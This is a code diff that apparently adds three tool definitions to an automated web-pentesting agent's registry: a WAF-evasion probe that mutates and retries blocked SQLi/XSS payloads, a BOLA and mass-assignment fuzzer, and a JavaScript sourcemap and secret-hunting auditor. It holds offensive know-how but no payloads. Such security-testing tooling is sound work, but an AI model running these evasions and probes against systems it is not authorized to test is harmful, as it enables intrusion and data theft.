+            "every mutation tried and which ones were blocked, so you can see exactly what worked. A mutation "
+            "getting past the WAF does NOT by itself confirm the vulnerability still fires — re-verify impact "
+            "with the winning mutated payload afterward (reflection check, sqlmap_scan, OOB listener, etc.)."
+        ),
+        parameters={
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "The endpoint that blocked the original payload."},
+                "payload": {"type": "string", "description": "The exact payload that got blocked, to mutate and retry."},
+                "param": {"type": "string", "description": "Parameter name to inject the (mutated) payload into. Default 'test'."},
+                "method": {"type": "string", "description": "HTTP method, GET or POST. Default GET."},
+                "payload_type": {"type": "string", "description": "Optional hint: 'sqli', 'xss', or 'generic' — picks extra type-specific mutations (SQL keyword splitting, HTML entity encoding). Auto-detected from the payload if omitted."}
+            },
+            "required": ["url", "payload"]
+        },
+        executor=_execute_waf_evasion_probe
+    ),
+    "schema_fuzzer": ToolSpec(
+        name="schema_fuzzer",
+        description=(
+            "Schema-driven BOLA and mass-assignment checks, seeded from the endpoint/param table 'spider' "
+            "already built (target.state spider_intel) instead of guessing endpoints blind. Run 'spider' "
+            "first. BOLA check: for endpoints with a numeric path/query ID, tries the adjacent ID (id+1) with "
+            "YOUR current session and flags it if a DIFFERENT 200 response comes back — a possible horizontal "
+            "privilege escalation signal (NOT a confirmed finding — verify the returned object really belongs "
+            "to someone else before recording). Mass-assignment check: for POST/PUT/PATCH endpoints, sends "
+            "the known legitimate params plus a batch of extra privilege/financial fields the client was "
+            "never supposed to set (role, isAdmin, balance, etc.) and flags it if the server echoes them back "
+            "as accepted. Both checks are capped (max_checks) and report signals only, by design — they do "
+            "not call record_finding themselves."
+        ),
+        parameters={
+            "type": "object",
+            "properties": {
+                "checks": {"type": "string", "description": "Comma-separated subset to run: 'bola', 'mass_assignment', or both (default both)."},
+                "max_checks": {"type": "integer", "description": "Cap on how many endpoints to test per check type (default 8, max 15) — keeps this bounded and low-noise."}
+            }
+        },
+        executor=_execute_schema_fuzz
     ),
     "dns_bruteforce": ToolSpec(
         name="dns_bruteforce",
@@ -7499,6 +8148,31 @@ TOOL_REGISTRY: Dict[str, ToolSpec] = {
             "required": ["url"]
         },
         executor=_execute_cloudscout
+    ),
+    "js_static_analysis": ToolSpec(
+        name="js_static_analysis",
+        description=(
+            "Recover and statically audit this target's client-side JavaScript: finds and unpacks "
+            "exposed sourcemaps to reconstruct original source (recovering real file names/structure "
+            "from minified bundles, hunting for hardcoded secrets/API keys and endpoint paths along "
+            "the way), then runs the recovered source through signature-based sink detection — "
+            "eval()/dangerouslySetInnerHTML, hardcoded admin/role checks, localStorage misuse, "
+            "hardcoded credentials, internal/dev URLs, client-side SQL string concatenation, insecure "
+            "ws://http:// endpoints, and hidden admin/debug routes. Use this when a target is a "
+            "JS-heavy SPA/bundle app and you want to see what the client-side code itself reveals, "
+            "not just what the server returns — this is a different signal from spider's live-crawl "
+            "endpoint discovery. Reuses this target's captured session automatically, same as every "
+            "other tool here, so it can reach bundles/sourcemaps gated behind login."
+        ),
+        parameters={
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "Target base URL to recover and audit JS from."},
+                "use_ai": {"type": "boolean", "description": "Run an extra LLM pass to verify sink findings and cut false positives (default: false — off unless explicitly asked, since it calls a separately-configured AI provider).", "default": False}
+            },
+            "required": ["url"]
+        },
+        executor=_execute_js_static_analysis
     ),
     "transport_auditor": ToolSpec(
         name="transport_auditor",
